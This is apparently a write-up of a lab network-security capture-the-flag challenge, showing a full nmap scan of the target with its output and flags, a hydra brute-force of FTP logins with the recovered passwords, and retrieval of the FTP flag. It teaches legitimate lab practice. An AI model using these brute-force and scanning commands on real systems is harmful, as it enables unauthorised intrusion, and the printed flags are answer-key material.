#CTF 

Use this challenge to test your mastery of the skills you have acquired in the Network Security module. All the questions in this challenge can be solved using only `nmap`, `telnet`, and `hydra`.

## Recon

So we are going to scan this machine with [[Nmap]] as usual. But the questions ask for a non common port so I am going to run nmap with 
`nmap -sC -sV -p- -T4 --min-rate=9326 -vv [ip]`
The results are:

```
Discovered open port 80/tcp on 10.10.80.102
Discovered open port 22/tcp on 10.10.80.102
Discovered open port 139/tcp on 10.10.80.102
Discovered open port 8080/tcp on 10.10.80.102
Discovered open port 445/tcp on 10.10.80.102
Discovered open port 10021/tcp on 10.10.80.102
Completed SYN Stealth Scan at 14:55, 9.78s elapsed (65535 total ports)
Initiating Service scan at 14:55
Scanning 6 services on ip-10-10-80-102.eu-west-1.compute.internal (10.10.80.102)
Completed Service scan at 14:57, 121.17s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.80.102.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 14:57
Completed NSE at 14:57, 3.04s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 14:57
Completed NSE at 14:57, 1.02s elapsed
Nmap scan report for ip-10-10-80-102.eu-west-1.compute.internal (10.10.80.102)
Host is up, received arp-response (0.00062s latency).
Scanned at 2023-05-01 14:55:13 BST for 135s
Not shown: 65529 closed ports
Reason: 65529 resets
PORT      STATE SERVICE       REASON         VERSION
22/tcp    open  ssh           syn-ack ttl 64 (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
80/tcp    open  http          syn-ack ttl 64 lighttpd
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: lighttpd THM{web_server_25352}
|_http-title: Hello, world!
139/tcp   open  netbios-ssn?  syn-ack ttl 64
| fingerprint-strings: 
|   SMBProgNeg: 
|_    SMBr
445/tcp   open  microsoft-ds? syn-ack ttl 64
| fingerprint-strings: 
|   SMBProgNeg: 
|_    SMBr
8080/tcp  open  http          syn-ack ttl 64 Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
10021/tcp open  ftp           syn-ack ttl 64 vsftpd 3.0.3
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.60%I=7%D=5/1%Time=644FC4D1%P=x86_64-pc-linux-gnu%r(NULL,
SF:29,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port139-TCP:V=7.60%I=7%D=5/1%Time=644FC4D6%P=x86_64-pc-linux-gnu%r(SMBP
SF:rogNeg,29,"\0\0\0%\xffSMBr\0\0\0\0\x88\x03@\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:@\x06\0\0\x01\0\x01\xff\xff\0\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port445-TCP:V=7.60%I=7%D=5/1%Time=644FC4D1%P=x86_64-pc-linux-gnu%r(SMBP
SF:rogNeg,29,"\0\0\0%\xffSMBr\0\0\0\0\x88\x03@\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:@\x06\0\0\x01\0\x01\xff\xff\0\0");
MAC Address: 02:5D:68:ED:0E:D5 (Unknown)
Service Info: OS: Unix

Host script results:
| nbstat: NetBIOS name: NETSEC-CHALLENG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   NETSEC-CHALLENG<00>  Flags: <unique><active>
|   NETSEC-CHALLENG<03>  Flags: <unique><active>
|   NETSEC-CHALLENG<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 12699/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 13823/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 50120/udp): CLEAN (Failed to receive data)
|   Check 4 (port 36665/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-05-01 14:57:25
|_  start_date: 1600-12-31 23:58:45

```


Lots of information here, some questions of the challenge can be answered via this nmap.

## Connect

Next we have to connect on the FTP server and gain a flag. We have two usernames:
`eddie` and `quinn`
but no passwords, so we are going to use [[Hydra]] to find them. First I pass the usernames in a file with
`echo eddie > users.txt`
`echo quinn >> users.txt` and the I run Hydra with:
`hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -vV ftp://[ip]:10021`
And I get <font color=red> jordan</font> for eddie and <font color=red> andrea</font> for quinn

To login to those accounts we type:
`ftp [ip] [port, eg. 10021]`
type the username and the password. I couldn't find anything on eddies account, but quinn had a ftp_flag.txt, so I typed `get ftp_flag.txt` and got it locally.

Lastly I need to do a silent nmap scan to get the last flag. To do this we use `-sN` switch and get the flag.
